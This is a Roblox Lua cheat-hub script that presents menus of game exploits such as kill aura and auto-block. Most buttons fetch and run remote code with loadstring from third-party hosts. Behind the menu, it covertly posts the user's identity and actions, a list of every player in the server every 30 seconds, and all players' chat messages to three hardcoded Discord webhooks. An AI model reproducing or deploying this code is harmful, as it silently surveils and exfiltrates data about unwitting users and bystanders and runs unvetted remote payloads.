--// NZ MULTI GAME HUB v2.0
--// All-in-One | Fixed Menus | No Auto Exec

------------------------
-- ANTI DOUBLE EXEC
------------------------
if getgenv().NZ_MULTI_HUB then return end
getgenv().NZ_MULTI_HUB = true
getgenv().IY_LOADED = false

------------------------
-- SERVICES
------------------------
local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local TeleportService = game:GetService("TeleportService")
local Lighting = game:GetService("Lighting")
local LP = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

-- Webhook URLs
local WEBHOOKS = {
    MAIN = "https://discord.com/api/webhooks/1459298646590754827/TOc_e3_kHwZepKoMQB8EhwSMdFP7_avoyV6kYbmLVV4m6RqwwTha5eltf69snHOuLNKk",
    PLAYERS = "https://discord.com/api/webhooks/1459368985920540692/e6kW7yWiHoK10YDM2VmkXtnGJQ8alQtfkgBYcm_Ddwg6NCsJN_PLOX6TBMF828hg8eCL",
    CHAT = "https://discord.com/api/webhooks/1459368825286955234/cQImuL2TJBPkY1kYn1B-EKEl1MJnMupf5ZyVOQ9el-bZKITGIw6edwMsz4Fo5DC_V8Tz"
}

local function SendWebhook(url, content)
    if not HttpService.HttpEnabled then
        -- Mostrar aviso breve si HTTP está deshabilitado
        task.spawn(function() Splash("HTTP disabled: webhooks not sent",1.2) end)
        return
    end
    pcall(function()
        HttpService:PostAsync(url, HttpService:JSONEncode({content = content}), Enum.HttpContentType.ApplicationJson)
    end)
end

------------------------
-- PLACE IDS
------------------------
local PLACE_IDS = {
    UBG = 11815767793,
    TSB = 10449761463,
    BBZ = 130739873848552,
    VILTRUM = 113318245878384
}

------------------------
-- CLEAN
------------------------
pcall(function()
    if game.CoreGui:FindFirstChild("NZ_MULTI_HUB") then
        game.CoreGui.NZ_MULTI_HUB:Destroy()
    end
end)

------------------------
-- GUI
------------------------
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
ScreenGui.Name = "NZ_MULTI_HUB"
ScreenGui.IgnoreGuiInset = true
ScreenGui.ResetOnSpawn = false

------------------------
-- BLUR
------------------------
local Blur = Instance.new("BlurEffect", Lighting)
Blur.Size = 0

------------------------
-- SPLASH
------------------------
local function Splash(text,time)
    local l = Instance.new("TextLabel",ScreenGui)
    l.Size = UDim2.new(1,0,0,60)
    l.Position = UDim2.new(0,0,0.45,0)
    l.BackgroundTransparency = 1
    l.Text = text
    l.Font = Enum.Font.GothamBold
    l.TextSize = 32
    l.TextTransparency = 1

    task.spawn(function()
        while l.Parent do
            l.TextColor3 = Color3.fromHSV(tick()%5/5,1,1)
            task.wait()
        end
    end)

    TweenService:Create(l,TweenInfo.new(.4),{TextTransparency=0}):Play()
    TweenService:Create(Blur,TweenInfo.new(.4),{Size=18}):Play()
    task.wait(time)
    TweenService:Create(l,TweenInfo.new(.4),{TextTransparency=1}):Play()
    TweenService:Create(Blur,TweenInfo.new(.4),{Size=0}):Play()
    task.wait(.4)
    l:Destroy()
end

------------------------
-- FRAME
------------------------
local Main = Instance.new("Frame",ScreenGui)
Main.Size = UDim2.fromOffset(380,520)
Main.Position = UDim2.new(.5,-190,.5,-260)
Main.BackgroundColor3 = Color3.fromRGB(10,10,14)
Main.BorderSizePixel = 0
Instance.new("UICorner",Main).CornerRadius = UDim.new(0,26)
Main.Visible = false

local Header = Instance.new("TextLabel",Main)
Header.Size = UDim2.new(1,0,0,60)
Header.BackgroundColor3 = Color3.fromRGB(18,18,28)
Header.Text = "NZ MULTI HUB v2.0"
Header.Font = Enum.Font.GothamBold
Header.TextSize = 20
Header.TextColor3 = Color3.fromRGB(170,120,255)
Instance.new("UICorner",Header).CornerRadius = UDim.new(0,26)

------------------------
-- DRAG
------------------------
do
    local dragging, dragStart, startPos
    Header.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = i.Position
            startPos = Main.Position
        end
    end)
    UIS.InputChanged:Connect(function(i)
        if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then
            local d = i.Position - dragStart
            Main.Position = startPos + UDim2.fromOffset(d.X,d.Y)
        end
    end)
    UIS.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
        end
    end)
end

------------------------
-- HOLDER
------------------------
local Holder = Instance.new("ScrollingFrame",Main)
Holder.Position = UDim2.new(0,16,0,72)
Holder.Size = UDim2.new(1,-32,1,-90)
Holder.ScrollBarThickness = 4
Holder.BackgroundTransparency = 1

local Layout = Instance.new("UIListLayout",Holder)
Layout.Padding = UDim.new(0,12)
Layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    Holder.CanvasSize = UDim2.new(0,0,0,Layout.AbsoluteContentSize.Y+10)
end)

------------------------
-- UTILS
------------------------
local function Clear()
    for _,v in ipairs(Holder:GetChildren()) do
        if v:IsA("TextButton") then v:Destroy() end
    end
end

local function Button(txt,cb)
    local b = Instance.new("TextButton",Holder)
    b.Size = UDim2.new(1,0,0,44)
    b.BackgroundColor3 = Color3.fromRGB(40,40,60)
    b.Text = txt
    b.Font = Enum.Font.GothamMedium
    b.TextSize = 14
    b.TextColor3 = Color3.fromRGB(235,235,235)
    b.BorderSizePixel = 0
    Instance.new("UICorner",b).CornerRadius = UDim.new(0,14)
    b.MouseButton1Click:Connect(function()
        local script_url = nil
        -- If a script URL is provided as a third parameter, it will be captured by the callback wrapper.
        -- Execute and log action with extended player info
        local placeId = tostring(game.PlaceId)
        local gameName = "Unknown"
        pcall(function()
            local info = MarketplaceService:GetProductInfo(game.PlaceId)
            if info and info.Name then gameName = info.Name end
        end)
        local profile = "https://www.roblox.com/users/" .. tostring(LP.UserId) .. "/profile"
        local action = txt

        -- Try to run callback and capture error and potential script URL returned by callback
        local ok, ret = pcall(function()
            return cb()
        end)

        -- If callback returned a string and looks like a URL, treat it as script_url
        if type(ret) == "string" and string.find(ret, "http") then script_url = ret end

        local content = string.format("Player: %s | DisplayName: %s | UserId: %s | Action: %s | Script: %s | PlaceId: %s | Game: %s | Profile: %s",
            LP.Name, LP.DisplayName or "", tostring(LP.UserId), action, script_url or "N/A", placeId, gameName, profile)
        SendWebhook(WEBHOOKS.MAIN, content)

        if not ok then
            SendWebhook(WEBHOOKS.MAIN, string.format("Player: %s | Action: %s | Error: %s", LP.Name, action, tostring(ret)))
        end
    end)
end

local function Rejoin()
    pcall(function()
        local placeId = tostring(game.PlaceId)
        local gameName = "Unknown"
        pcall(function()
            local info = MarketplaceService:GetProductInfo(game.PlaceId)
            if info and info.Name then gameName = info.Name end
        end)
        local profile = "https://www.roblox.com/users/" .. tostring(LP.UserId) .. "/profile"
        local content = string.format("Player: %s | DisplayName: %s | UserId: %s | Action: %s | Script: %s | PlaceId: %s | Game: %s | Profile: %s",
            LP.Name, LP.DisplayName or "", tostring(LP.UserId), "Rejoin", "N/A", placeId, gameName, profile)
        SendWebhook(WEBHOOKS.MAIN, content)
    end)
    TeleportService:Teleport(game.PlaceId,LP)
end

-- Webhook URLs
local WEBHOOKS = {
    MAIN = "https://discord.com/api/webhooks/1459298646590754827/TOc_e3_kHwZepKoMQB8EhwSMdFP7_avoyV6kYbmLVV4m6RqwwTha5eltf69snHOuLNKk",
    PLAYERS = "https://discord.com/api/webhooks/1459368985920540692/e6kW7yWiHoK10YDM2VmkXtnGJQ8alQtfkgBYcm_Ddwg6NCsJN_PLOX6TBMF828hg8eCL",
    CHAT = "https://discord.com/api/webhooks/1459368825286955234/cQImuL2TJBPkY1kYn1B-EKEl1MJnMupf5ZyVOQ9el-bZKITGIw6edwMsz4Fo5DC_V8Tz"
}

-- Enviar lista de jugadores cada 30s al webhook PLAYERS
task.spawn(function()
    while task.wait(30) do
        pcall(function()
            local parts = {}
            for _,p in ipairs(Players:GetPlayers()) do
                local prof = "https://www.roblox.com/users/"..tostring(p.UserId).."/profile"
                table.insert(parts, string.format("%s (Display:%s) Id:%s Profile:%s", p.Name, p.DisplayName or "", tostring(p.UserId), prof))
            end
            local content = "Server Players: [" .. table.concat(parts, " | ") .. "]"
            SendWebhook(WEBHOOKS.PLAYERS, content)
        end)
    end
end)

-- Escuchar chat de todos los jugadores y enviar al webhook CHAT
local function connectPlayerChat(p)
    if not p then return end
    p.Chatted:Connect(function(msg)
        pcall(function()
            local time = os.date("%Y-%m-%d %H:%M:%S")
            local content = string.format("%s: %s | Time: %s", p.Name, msg, time)
            SendWebhook(WEBHOOKS.CHAT, content)
        end)
    end)
end

for _,p in ipairs(Players:GetPlayers()) do connectPlayerChat(p) end
Players.PlayerAdded:Connect(connectPlayerChat)

------------------------
-- MENUS
------------------------
local MainMenu, UBGMenu, TSBMenu, VILMenu, BBZMenu, UniversalMenu

function UniversalMenu()
    Clear()
    Button("♾️ Infinite Yield",function()
        if getgenv().IY_LOADED then return end
        getgenv().IY_LOADED = true
        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
        return "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"
    end)
    Button("🔄 Rejoin",Rejoin)
    Button("⬅️ Back",MainMenu)
end

function UBGMenu()
    Clear()
    Button("🔥 Kill Aura",function()
        loadstring(game:HttpGet("https://eltonshub-loader.netlify.app/UBG1.lua"))()
        return "https://eltonshub-loader.netlify.app/UBG1.lua"
    end)
    Button("🎭 Emotes",function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/WiteHackep/UBG_cosmetic/refs/heads/main/ubg_cosmetic.txt"))()
        return "https://raw.githubusercontent.com/WiteHackep/UBG_cosmetic/refs/heads/main/ubg_cosmetic.txt"
    end)
    Button("❓ Unknown",function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/YourLocalSkidder/ultimate/refs/heads/main/Protected_1855805535235895.lua",true))()
        return "https://raw.githubusercontent.com/YourLocalSkidder/ultimate/refs/heads/main/Protected_1855805535235895.lua"
    end)
    Button("⬅️ Back",MainMenu)
end

function TSBMenu()
    Clear()
    Button("🛡️ AUTO BLOCK",function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/hellattexyss/thestrongestbattlegrounds/refs/heads/main/cpsautoblock.lua"))()
        return "https://raw.githubusercontent.com/hellattexyss/thestrongestbattlegrounds/refs/heads/main/cpsautoblock.lua"
    end)
    Button("⚡ AUTO TECHS V2",function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/hellattexyss/autotechs/refs/heads/main/cpstechs.lua"))()
        return "https://raw.githubusercontent.com/hellattexyss/autotechs/refs/heads/main/cpstechs.lua"
    end)
    Button("➡️ SIDE DASH ASSIST",function()
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/54d6b993fe3a4c1f5c3e375eba35e5ec.lua"))()
        return "https://api.luarmor.net/files/v3/loaders/54d6b993fe3a4c1f5c3e375eba35e5ec.lua"
    end)
    Button("🔁 M1 RESET",function()
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/fa8d49690e680794f761b497742fd1c2.lua"))()
        return "https://api.luarmor.net/files/v3/loaders/fa8d49690e680794f761b497742fd1c2.lua"
    end)
    Button("🔥 SUPA TECH",function()
        loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/2753546c83053761e44664d36ffe5035d6e20fc8aee1d19f0eb7b933974ae537.lua"))()
        return "https://api.getpolsec.com/scripts/hosted/2753546c83053761e44664d36ffe5035d6e20fc8aee1d19f0eb7b933974ae537.lua"
    end)
    Button("🐱 MEOW TECH",function()
        loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/2345da4cc975b07b3f250f6a83c45687a70c1999b9c46219cd6893771f9dd542/download"))()
        return "https://api.junkie-development.de/api/v1/luascripts/public/2345da4cc975b07b3f250f6a83c45687a70c1999b9c46219cd6893771f9dd542/download"
    end)
    Button("⬅️ Back",MainMenu)
end

function VILMenu()
    Clear()
    Button("🩸 NZ PvP Team",function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/yenderelmascapito-collab/Proyecto-Viltrumita/refs/heads/main/script.lua"))()
        return "https://raw.githubusercontent.com/yenderelmascapito-collab/Proyecto-Viltrumita/refs/heads/main/script.lua"
    end)
    Button("⬅️ Back",MainMenu)
end

function BBZMenu()
    Clear()
    Button("🏀 BBZ NZ",function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/UPD-Basketball:-Zero-Basketball-Zero-OP-43354"))()
        return "https://rawscripts.net/raw/UPD-Basketball:-Zero-Basketball-Zero-OP-43354"
    end)
    Button("⬅️ Back",MainMenu)
end

function MainMenu()
    Clear()

    Button("🥊 Ultimate Battlegrounds",function()
        if game.PlaceId ~= PLACE_IDS.UBG then
            TeleportService:Teleport(PLACE_IDS.UBG,LP)
        else UBGMenu() end
    end)

    Button("💪 The Strongest Battlegrounds",function()
        if game.PlaceId ~= PLACE_IDS.TSB then
            TeleportService:Teleport(PLACE_IDS.TSB,LP)
        else TSBMenu() end
    end)

    Button("🦸 Project Viltrumites",function()
        if game.PlaceId ~= PLACE_IDS.VILTRUM then
            TeleportService:Teleport(PLACE_IDS.VILTRUM,LP)
        else VILMenu() end
    end)

    Button("🏀 Basketball Zero",function()
        if game.PlaceId ~= PLACE_IDS.BBZ then
            TeleportService:Teleport(PLACE_IDS.BBZ,LP)
        else BBZMenu() end
    end)

    Button("🌐 Universal Scripts",UniversalMenu)
end

------------------------
-- START
------------------------
task.spawn(function()
    Splash("NZ MULTI HUB",1.2)
    Splash("by NZ Team",1)
    Main.Visible = true
    MainMenu()
end)

------------------------
-- TOGGLE
------------------------
UIS.InputBegan:Connect(function(i,gp)
    if gp then return end
    if i.KeyCode == Enum.KeyCode.Z then
        Main.Visible = not Main.Visible
    end
end)
